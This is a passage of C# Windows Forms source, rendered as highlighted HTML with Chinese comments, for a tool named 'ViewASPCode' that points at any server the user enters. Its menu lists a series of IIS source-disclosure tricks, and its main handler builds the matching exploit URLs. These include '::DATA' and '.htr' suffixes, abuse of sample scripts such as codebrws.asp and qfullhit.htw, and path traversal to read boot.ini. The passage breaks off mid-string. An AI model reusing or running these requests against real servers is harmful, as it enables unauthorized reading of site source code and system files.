            txtFileName<span class="token punctuation">.</span>Location <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>Drawing<span class="token punctuation">.</span>Point</span><span class="token punctuation">(</span><span class="token number">304</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            txtFileName<span class="token punctuation">.</span>TabIndex <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>
            txtFileName<span class="token punctuation">.</span>Size <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>Drawing<span class="token punctuation">.</span>Size</span><span class="token punctuation">(</span><span class="token number">232</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">&quot;ViewASPCode&quot;</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>StartPosition <span class="token operator">=</span> System<span class="token punctuation">.</span>WinForms<span class="token punctuation">.</span>FormStartPosition<span class="token punctuation">.</span>CenterScreen<span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>AutoScaleBaseSize <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>Drawing<span class="token punctuation">.</span>Size</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>Menu <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>mainMenu1<span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>ClientSize <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">System<span class="token punctuation">.</span>Drawing<span class="token punctuation">.</span>Size</span><span class="token punctuation">(</span><span class="token number">568</span><span class="token punctuation">,</span> <span class="token number">441</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>Controls<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>barStatus<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>Controls<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>btnClear<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>Controls<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>txtResult<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>Controls<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>btnGo<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>Controls<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>label3<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>Controls<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>cboMethod<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>Controls<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>txtFileName<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>Controls<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>label2<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>Controls<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>txtServer<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>Controls<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>label1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">//菜单项about点击，显示about对话框</span>
        <span class="token keyword">protected</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">mnuAbount_Click</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">object</span></span> sender<span class="token punctuation">,</span> <span class="token class-name">System<span class="token punctuation">.</span>EventArgs</span> e<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token class-name">about</span> objAbout <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token constructor-invocation class-name">about</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            objAbout<span class="token punctuation">.</span><span class="token function">ShowDialog</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            objAbout<span class="token punctuation">.</span><span class="token function">Dispose</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">//初始化窗口</span>
        <span class="token keyword">private</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">InitForm</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>cboMethod<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token string">&quot;直接读取&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>cboMethod<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token string">&quot;.&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>cboMethod<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token string">&quot;%81&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>cboMethod<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token string">&quot;::DATA&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>cboMethod<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token string">&quot;%2e&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>cboMethod<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token string">&quot;%2e%41sp&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>cboMethod<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token string">&quot;+.htr&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>cboMethod<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token string">&quot;\\\\&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>cboMethod<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token string">&quot;longhtr&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>cboMethod<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token string">&quot;.bak&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>cboMethod<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token string">&quot;codebrws.asp&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>cboMethod<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token string">&quot;showcode.asp&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>cboMethod<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token string">&quot;null.htw&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>cboMethod<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token string">&quot;qfullhit.htw&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>cboMethod<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token string">&quot;qsumrhit.htw&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>cboMethod<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token string">&quot;query.idq&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>cboMethod<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token string">&quot;search/qfullhit.htw&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>cboMethod<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token string">&quot;search/qsumrhit.htw&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>cboMethod<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token string">&quot;iirturnh.htw&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>cboMethod<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token string">&quot;.htw&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>cboMethod<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token string">&quot;Translate:f&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token keyword">this</span><span class="token punctuation">.</span>cboMethod<span class="token punctuation">.</span>SelectedIndex <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">//新建</span>
        <span class="token keyword">protected</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">mnuNew_Click</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">object</span></span> sender<span class="token punctuation">,</span> <span class="token class-name">System<span class="token punctuation">.</span>EventArgs</span> e<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>txtServer<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">&quot;http://&quot;</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>txtFileName<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>txtResult<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">//清除结果</span>
        <span class="token keyword">protected</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">btnClear_Click</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">object</span></span> sender<span class="token punctuation">,</span> <span class="token class-name">System<span class="token punctuation">.</span>EventArgs</span> e<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>txtResult<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token comment">//主要方法</span>
        <span class="token keyword">protected</span> <span class="token return-type class-name"><span class="token keyword">void</span></span> <span class="token function">btnGo_Click</span><span class="token punctuation">(</span><span class="token class-name"><span class="token keyword">object</span></span> sender<span class="token punctuation">,</span> <span class="token class-name">System<span class="token punctuation">.</span>EventArgs</span> e<span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token comment">//解析url</span>
            <span class="token class-name"><span class="token keyword">string</span></span> strServer <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>txtServer<span class="token punctuation">.</span>Text<span class="token punctuation">;</span>
            <span class="token class-name"><span class="token keyword">string</span></span> strUrl <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>txtFileName<span class="token punctuation">.</span>Text<span class="token punctuation">;</span>
            <span class="token class-name"><span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> point <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token char">&#39;.&#39;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token comment">//定义分割符为&quot;.&quot;</span>
            <span class="token class-name"><span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> line <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token char">&#39;/&#39;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token comment">//定义分割符为&quot;.&quot;</span>
            <span class="token class-name"><span class="token keyword">string</span><span class="token punctuation">[</span><span class="token punctuation">]</span></span> arrString <span class="token operator">=</span> strUrl<span class="token punctuation">.</span><span class="token function">Split</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token comment">//求asp文件全名</span>
            <span class="token class-name"><span class="token keyword">string</span></span> strFileName <span class="token operator">=</span> arrString<span class="token punctuation">[</span>arrString<span class="token punctuation">.</span>Length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token comment">//求从根目录下的路径</span>
            <span class="token class-name"><span class="token keyword">string</span></span> strPath <span class="token operator">=</span> strUrl<span class="token punctuation">.</span><span class="token function">Substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>
            strUrl<span class="token punctuation">.</span>Length <span class="token operator">-</span> strFileName<span class="token punctuation">.</span>Length<span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token comment">//解析文件全名</span>
            arrString <span class="token operator">=</span> strFileName<span class="token punctuation">.</span><span class="token function">Split</span><span class="token punctuation">(</span>point<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token comment">//求文件扩展名</span>
            <span class="token class-name"><span class="token keyword">string</span></span> strLast <span class="token operator">=</span> arrString<span class="token punctuation">[</span>arrString<span class="token punctuation">.</span>Length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token comment">//求文件名</span>
            <span class="token class-name"><span class="token keyword">string</span></span> strFirst <span class="token operator">=</span> strFileName<span class="token punctuation">.</span><span class="token function">Substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>
            strFileName<span class="token punctuation">.</span>Length <span class="token operator">-</span> strLast<span class="token punctuation">.</span>Length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

            <span class="token comment">//使按钮、输入框等失效</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>txtServer<span class="token punctuation">.</span>ReadOnly <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>txtFileName<span class="token punctuation">.</span>ReadOnly <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>btnClear<span class="token punctuation">.</span>Enabled <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>btnGo<span class="token punctuation">.</span>Enabled <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>

            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>txtServer<span class="token punctuation">.</span>Text <span class="token operator">==</span> <span class="token string">&quot;http://&quot;</span> <span class="token operator">||</span> <span class="token keyword">this</span><span class="token punctuation">.</span>txtFileName<span class="token punctuation">.</span>Text <span class="token operator">==</span> <span class="token string">&quot;&quot;</span>
            <span class="token operator">||</span> <span class="token keyword">this</span><span class="token punctuation">.</span>txtServer<span class="token punctuation">.</span>Text<span class="token punctuation">.</span><span class="token function">Trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">&quot;&quot;</span> <span class="token operator">||</span>
            <span class="token keyword">this</span><span class="token punctuation">.</span>txtServer<span class="token punctuation">.</span>Text<span class="token punctuation">.</span><span class="token function">Substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">&quot;http://&quot;</span><span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                MessageBox<span class="token punctuation">.</span><span class="token function">Show</span><span class="token punctuation">(</span><span class="token string">&quot;请输入正确的主机名和文件名！&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span>txtServer<span class="token punctuation">.</span><span class="token function">Focus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">else</span>
            <span class="token punctuation">{</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span>txtResult<span class="token punctuation">.</span>Visible <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span>txtResult<span class="token punctuation">.</span>ReadOnly <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span>barStatus<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">&quot;正在连结主机…&quot;</span><span class="token punctuation">;</span>

                <span class="token class-name"><span class="token keyword">string</span></span> strRequestFile<span class="token punctuation">;</span>

                <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>cboMethod<span class="token punctuation">.</span>SelectedIndex<span class="token punctuation">)</span>
                <span class="token punctuation">{</span>
                    <span class="token keyword">case</span> <span class="token number">0</span><span class="token punctuation">:</span> <span class="token comment">//直接读取</span>
                        strRequestFile <span class="token operator">=</span> strServer <span class="token operator">+</span> strUrl<span class="token punctuation">;</span>
                        <span class="token keyword">break</span><span class="token punctuation">;</span>
                    <span class="token keyword">case</span> <span class="token number">5</span><span class="token punctuation">:</span> <span class="token comment">//%2e%41sp</span>
                        strRequestFile <span class="token operator">=</span> strServer <span class="token operator">+</span> strPath <span class="token operator">+</span> strFirst
                        <span class="token operator">+</span> <span class="token string">&quot;%2e%41sp&quot;</span><span class="token punctuation">;</span>
                        <span class="token keyword">break</span><span class="token punctuation">;</span>
                    <span class="token keyword">case</span> <span class="token number">8</span><span class="token punctuation">:</span> <span class="token comment">//longhtr</span>
                        strRequestFile <span class="token operator">=</span> strServer <span class="token operator">+</span> strUrl
                        <span class="token operator">+</span> <span class="token string">&quot;+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;%20%20%20%20%20%20%20%20&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20.htr&quot;</span><span class="token punctuation">;</span>
                        <span class="token keyword">break</span><span class="token punctuation">;</span>
                    <span class="token keyword">case</span> <span class="token number">10</span><span class="token punctuation">:</span> <span class="token comment">//codebrws.asp</span>
                        strRequestFile <span class="token operator">=</span> strServer <span class="token operator">+</span> <span class="token string">&quot;/iissamples/exair/howitworks/codebrws.asp?source=&quot;</span>
                        <span class="token operator">+</span> strUrl<span class="token punctuation">;</span>
                        <span class="token keyword">break</span><span class="token punctuation">;</span>
                    <span class="token keyword">case</span> <span class="token number">11</span><span class="token punctuation">:</span> <span class="token comment">//showcode.asp</span>
                        strRequestFile <span class="token operator">=</span> strServer <span class="token operator">+</span> <span class="token string">&quot;/iissamples/exair/howitworks/codebrws.asp?source=&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;/msadc/../../../../boot.ini&quot;</span><span class="token punctuation">;</span>
                        <span class="token keyword">break</span><span class="token punctuation">;</span>
                    <span class="token keyword">case</span> <span class="token number">12</span><span class="token punctuation">:</span> <span class="token comment">//null.htw</span>
                        strRequestFile <span class="token operator">=</span> strServer <span class="token operator">+</span> <span class="token string">&quot;/null.htw?CiWebHitsFile=&quot;</span>
                        <span class="token operator">+</span> strUrl <span class="token operator">+</span> <span class="token string">&quot;%20&amp;CiRestriction=none&amp;CiHiliteType=Full&quot;</span><span class="token punctuation">;</span>
                        <span class="token keyword">break</span><span class="token punctuation">;</span>
                    <span class="token keyword">case</span> <span class="token number">13</span><span class="token punctuation">:</span> <span class="token comment">//qfullhit.htw</span>
                        strRequestFile <span class="token operator">=</span> strServer <span class="token operator">+</span> <span class="token string">&quot;/iissamples/issamples/oop/qfullhit.htw?&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;CiWebHitsFile=/../../boot.ini&amp;CiRestriction=none&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;&amp;CiHiliteType=Full&quot;</span><span class="token punctuation">;</span>
                        <span class="token keyword">break</span><span class="token punctuation">;</span>
                    <span class="token keyword">case</span> <span class="token number">14</span><span class="token punctuation">:</span> <span class="token comment">//qsumrhit.htw</span>
                        strRequestFile <span class="token operator">=</span> strServer <span class="token operator">+</span> <span class="token string">&quot;/iissamples/issamples/oop/qsumrhit.htw?&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;CiWebHitsFile=/../../boot.ini&amp;CiRestriction=none&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;&amp;CiHiliteType=Full&quot;</span><span class="token punctuation">;</span>
                        <span class="token keyword">break</span><span class="token punctuation">;</span>
                    <span class="token keyword">case</span> <span class="token number">15</span><span class="token punctuation">:</span> <span class="token comment">//query.idq</span>
                        strRequestFile <span class="token operator">=</span> strServer <span class="token operator">+</span> <span class="token string">&quot;/query.idq?CiTemplate=/../../boot.ini&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;%20%20%20%20%20%20%20%20%20&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20.htx&quot;</span><span class="token punctuation">;</span>
                        <span class="token keyword">break</span><span class="token punctuation">;</span>
                    <span class="token keyword">case</span> <span class="token number">16</span><span class="token punctuation">:</span> <span class="token comment">//search/qfullhit.htw</span>
                        strRequestFile <span class="token operator">=</span> strServer <span class="token operator">+</span> <span class="token string">&quot;/iissamples/exair/search/qfullhit.htw?&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;CiWebHitsFile=/../../boot.ini&amp;CiRestriction=none&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;&amp;CiHiliteType=Full&quot;</span><span class="token punctuation">;</span>
                        <span class="token keyword">break</span><span class="token punctuation">;</span>
                    <span class="token keyword">case</span> <span class="token number">17</span><span class="token punctuation">:</span> <span class="token comment">// search/qsumrhit.htw</span>
                        strRequestFile <span class="token operator">=</span> strServer <span class="token operator">+</span> <span class="token string">&quot;/iissamples/exair/search/qsumrhit.htw?&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;CiWebHitsFile=/../../boot.ini&amp;CiRestriction=none&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;&amp;CiHiliteType=Full&quot;</span><span class="token punctuation">;</span>
                        <span class="token keyword">break</span><span class="token punctuation">;</span>
                    <span class="token keyword">case</span> <span class="token number">18</span><span class="token punctuation">:</span> <span class="token comment">//iirturnh.htw</span>
                        strRequestFile <span class="token operator">=</span> strServer <span class="token operator">+</span> <span class="token string">&quot;/iishelp/iis/misc/iirturnh.htw?&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;CiWebHitsFile=/../../boot.ini&amp;CiRestriction=none&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;&amp;CiHiliteType=Full&quot;</span><span class="token punctuation">;</span>
                        <span class="token keyword">break</span><span class="token punctuation">;</span>
                    <span class="token keyword">case</span> <span class="token number">19</span><span class="token punctuation">:</span> <span class="token comment">//.htw</span>
                        strRequestFile <span class="token operator">=</span> strServer <span class="token operator">+</span> strUrl
                        <span class="token operator">+</span> <span class="token string">&quot;%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&quot;</span>
                        <span class="token operator">+</span> <span class="token string">&quot;%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20&quot;</span>
